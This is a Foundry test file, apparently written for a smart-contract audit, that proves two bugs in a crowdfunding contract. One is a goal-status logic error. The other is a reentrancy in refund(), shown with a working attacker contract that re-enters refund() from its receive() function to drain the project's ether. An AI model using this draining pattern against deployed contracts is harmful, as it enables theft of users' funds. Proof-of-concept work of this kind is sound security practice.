// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/Project.sol";
import "src/ProjectFactory.sol";

contract OpixBugPocs is Test {



    ProjectFactory projectFactory;
    Project project;
    address creator;
    address donater;
    address hacker;
    function setUp() public {

        projectFactory = new ProjectFactory();
        creator = address(0x1);
        donater = address(0x2);
        hacker = address(0x3);
        vm.deal(donater, 150 ether);
        vm.deal(hacker, 1 ether);
        vm.startPrank(creator);
        project = Project(projectFactory.create(100 ether, "Test", "TST"));
        vm.stopPrank();


    }

    function testFail_AchieveGoal() public {
        /// In the setGoalStatus modifier, the goalAchieved variable is set to true BEFORE the execution of the contribute function begins.
        /// i.e, the require statement in line 50 can never be satisfied, since if the current call to contribute is the one that makes the balance >= goal, then goalAchieved is already set to true in the modifier, i.e, the require statement fails, and the call to contribute reverts, i.e, the goal is never achieved.
        vm.startPrank(donater);
        project.contribute{value: 100 ether}();
        vm.stopPrank();
    } 

    function test_RefundReentrancy() public {
        // There is a reentrancy bug in the refund function, since contribution of the sender is set to 0 after the call to the sender, which can reenter into refund. 
        vm.deal(address(project), 10 ether); // the amount of ether we will drain from the project


        vm.startPrank(hacker);
        uint contrib_amt = 0.02 ether;


        ReentrancyHackerContract hackerContract = new 
        ReentrancyHackerContract(address(project), contrib_amt);

        // The hacker first contributed some money when the goal was not failed.
        hackerContract.contribute{value: contrib_amt}(); 



        vm.warp(block.timestamp +  31 days); // The goal is now failed, so we can call refund. (The hack takes place after this time, so this is not cheating.)

        hackerContract.hack();
 

        hackerContract.withdraw();
        vm.stopPrank();

        console.log("hackerContract.balance = ", address(hackerContract).balance);
        console.log("hacker.balance = ", address(hacker).balance);

        require(address(hacker).balance >= 10 ether, "Reentrancy failed");


    }


}


contract ReentrancyHackerContract {
    Project _victim;
    uint _contrib_amt;
    constructor(address victim, uint contrib_amt) {
        _victim = Project(victim);
        _contrib_amt = contrib_amt;
    }
    
    function contribute() payable external {
        _victim.contribute{value: _contrib_amt}();
    }



    function hack() payable external {

        _victim.refund();
    }

    receive() payable external {
        if(address(_victim).balance > _contrib_amt)
            _victim.refund();
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}